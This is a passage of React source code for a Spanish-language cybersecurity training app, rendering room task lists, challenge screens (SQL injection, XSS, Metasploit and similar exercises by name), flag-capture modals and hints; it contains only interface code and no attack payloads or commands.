        <div style={{ height:1,background:"linear-gradient(90deg,rgba(100,255,218,0.3),transparent)",marginBottom:26 }}/>
        <div style={{ display:"flex",flexDirection:"column",gap:10 }}>
          {room.tasks.map((t,i)=>{
            const key=`${room.id}-${t.id}`; const done=completed[key];
            const typeLabel={ terminal_cmd:"🖥️ Terminal Linux",quiz:"❓ Quiz",login_bypass:"💉 SQL Injection",xss_input:"🕷️ XSS Challenge",hash_crack:"🔓 Hash Cracking",caesar:"🔤 Cifrado Clásico",msf_terminal:"🛡️ Metasploit",bof_sim:"💥 Buffer Overflow",dork_quiz:"🔍 OSINT Dork",stego_quiz:"🖼️ Esteganografía",hex_quiz:"🔢 Análisis Hex",final_ctf:"🏁 Mini CTF" }[t.challenge.type]||"🎯 Desafío";
            return (
              <div key={t.id} onClick={()=>{ setTaskIdx(i); setFlagModal(null); setShowHint(false); setScreen("task"); }}
                style={{ background:done?"rgba(100,255,218,0.04)":"rgba(255,255,255,0.02)",border:`1px solid ${done?"rgba(100,255,218,0.25)":"rgba(255,255,255,0.07)"}`,borderRadius:10,padding:"15px 20px",cursor:"pointer",display:"flex",alignItems:"center",gap:14,transition:"all 0.2s" }}
                onMouseEnter={e=>e.currentTarget.style.background=done?"rgba(100,255,218,0.07)":"rgba(255,255,255,0.04)"}
                onMouseLeave={e=>e.currentTarget.style.background=done?"rgba(100,255,218,0.04)":"rgba(255,255,255,0.02)"}
              >
                <div style={{ width:30,height:30,borderRadius:"50%",background:done?"#64ffda":"rgba(255,255,255,0.06)",display:"flex",alignItems:"center",justifyContent:"center",color:done?"#080d16":"#3a5a7a",fontWeight:700,flexShrink:0,fontSize:13 }}>{done?"✓":i+1}</div>
                <div style={{ flex:1 }}>
                  <div style={{ color:done?"#64ffda":"#cdd6f4",fontWeight:done?700:400,fontSize:13 }}>{t.title}</div>
                  <div style={{ color:"#3a5a7a",fontSize:11,marginTop:2 }}>{typeLabel}</div>
                </div>
                <span style={{ color:"#3a5a7a",fontSize:16 }}>›</span>
              </div>
            );
          })}
        </div>
      </div>
      <AIAssistant context={`${room.title} — selección de tarea`}/>
    </div>
  );

  if(screen==="task"&&room){
    const task=room.tasks[taskIdx]; const key=`${room.id}-${task.id}`; const done=completed[key];
    const renderChallenge=()=>{
      switch(task.challenge.type){
        case "terminal_cmd": return <Terminal onSuccess={handleSuccess} flag={task.challenge.flag} answers={task.challenge.answers}/>;
        case "quiz": case "bof_sim": case "dork_quiz": case "stego_quiz": case "hex_quiz": return <Quiz task={task} onSuccess={handleSuccess}/>;
        case "login_bypass": return <LoginBypass task={task} onSuccess={handleSuccess}/>;
        case "xss_input": return <XSSChallenge task={task} onSuccess={handleSuccess}/>;
        case "hash_crack": return <HashCrack task={task} onSuccess={handleSuccess}/>;
        case "caesar": return <CaesarChallenge task={task} onSuccess={handleSuccess}/>;
        case "msf_terminal": return <MSFTerminal task={task} onSuccess={handleSuccess}/>;
        case "final_ctf": return <FinalCTF task={task} onSuccess={handleSuccess}/>;
        default: return <div style={{ color:"#ff6b6b" }}>Tipo de desafío no reconocido.</div>;
      }
    };
    const hint=task.challenge.hint||"";
    return (
      <div style={BASE}>
        <style>{CSS}</style>
        {flagModal&&(
          <div style={{ position:"fixed",top:0,left:0,right:0,bottom:0,background:"rgba(0,0,0,0.88)",zIndex:200,display:"flex",alignItems:"center",justifyContent:"center" }}>
            <div style={{ background:"#0a0f1a",border:"2px solid #64ffda",borderRadius:16,padding:"36px 44px",textAlign:"center",animation:"fadeIn 0.3s ease",maxWidth:400 }}>
              <div style={{ fontSize:56,marginBottom:14 }}>🚩</div>
              <div style={{ fontFamily:"'Orbitron',monospace",color:"#64ffda",fontSize:17,marginBottom:10 }}>¡FLAG CAPTURADA!</div>
              <div style={{ background:"#070b14",border:"1px solid rgba(100,255,218,0.3)",borderRadius:8,padding:"10px 20px",color:"#a8ff78",fontFamily:"monospace",fontSize:13,marginBottom:18,letterSpacing:1 }}>{flagModal}</div>
              <div style={{ color:"#3a5a7a",fontSize:12,marginBottom:20 }}>+{Math.floor(room.xp/room.tasks.length)} XP ganados</div>
              <div style={{ display:"flex",gap:10,justifyContent:"center",flexWrap:"wrap" }}>
                {taskIdx<room.tasks.length-1&&<button onClick={()=>{ setFlagModal(null); setTaskIdx(p=>p+1); setShowHint(false); }} style={{ padding:"10px 24px",background:"rgba(255,255,255,0.05)",color:"#cdd6f4",border:"1px solid rgba(255,255,255,0.1)",borderRadius:8,cursor:"pointer",fontWeight:700,fontFamily:"inherit",fontSize:13 }}>Siguiente tarea →</button>}
                <button onClick={()=>{ setFlagModal(null); setScreen("room"); }} style={{ padding:"10px 24px",background:"#64ffda",color:"#080d16",border:"none",borderRadius:8,cursor:"pointer",fontWeight:700,fontFamily:"inherit",fontSize:13 }}>Volver al room</button>
              </div>
            </div>
          </div>
        )}
        <div style={{ maxWidth:780,margin:"0 auto",padding:"30px 20px" }}>
          <div style={{ display:"flex",alignItems:"center",gap:8,marginBottom:22,fontSize:11,color:"#3a5a7a" }}>
            <button onClick={()=>setScreen("home")} style={{ background:"none",border:"none",color:"#3a5a7a",cursor:"pointer",fontFamily:"inherit",fontSize:11,padding:0 }}>Inicio</button>
            <span>›</span>
            <button onClick={()=>setScreen("room")} style={{ background:"none",border:"none",color:"#3a5a7a",cursor:"pointer",fontFamily:"inherit",fontSize:11,padding:0 }}>{room.title}</button>
            <span>›</span>
            <span style={{ color:"#64ffda" }}>{task.title}</span>
          </div>
          {done&&<div style={{ background:"rgba(100,255,218,0.06)",border:"1px solid rgba(100,255,218,0.25)",borderRadius:8,padding:"8px 14px",marginBottom:14,color:"#64ffda",fontSize:11 }}>✓ Tarea completada</div>}
          <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:6 }}>
            <h3 style={{ color:"#e0e0e0",fontSize:17,margin:0 }}>{task.title}</h3>
            <span style={{ color:"#3a5a7a",fontSize:11 }}>Tarea {taskIdx+1}/{room.tasks.length}</span>
          </div>
          <div style={{ height:1,background:"rgba(255,255,255,0.05)",marginBottom:22 }}/>
          <div style={{ background:"rgba(255,255,255,0.015)",border:"1px solid rgba(255,255,255,0.06)",borderRadius:10,padding:20,marginBottom:20 }}>
            <div style={{ color:"#64ffda",fontSize:10,fontWeight:700,marginBottom:14,textTransform:"uppercase",letterSpacing:1.5 }}>📚 Teoría</div>
            <div style={{ color:"#9ab0c4",fontSize:13,lineHeight:1.85 }}>{parseTheory(task.theory)}</div>
          </div>
          <div style={{ background:"rgba(255,255,255,0.015)",border:"1px solid rgba(100,255,218,0.12)",borderRadius:10,padding:20 }}>
            <div style={{ color:"#ffd93d",fontSize:10,fontWeight:700,marginBottom:16,textTransform:"uppercase",letterSpacing:1.5 }}>🎯 Desafío práctico</div>
            {renderChallenge()}
            {hint&&(
              <div style={{ marginTop:16 }}>
                <button onClick={()=>setShowHint(!showHint)} style={{ background:"none",border:"1px solid rgba(255,217,61,0.25)",borderRadius:6,color:"#ffd93d",padding:"5px 12px",cursor:"pointer",fontSize:11,fontFamily:"inherit" }}>{showHint?"Ocultar pista":"💡 Ver pista"}</button>
                {showHint&&<div style={{ marginTop:8,background:"rgba(255,217,61,0.04)",border:"1px solid rgba(255,217,61,0.18)",borderRadius:6,padding:"8px 12px",color:"#ffd93d",fontSize:11,lineHeight:1.6 }}>{hint}</div>}
              </div>
            )}
          </div>
        </div>
        <AIAssistant context={`${room.title} — ${task.title}`}/>
      </div>
    );
  }
  return null;
}
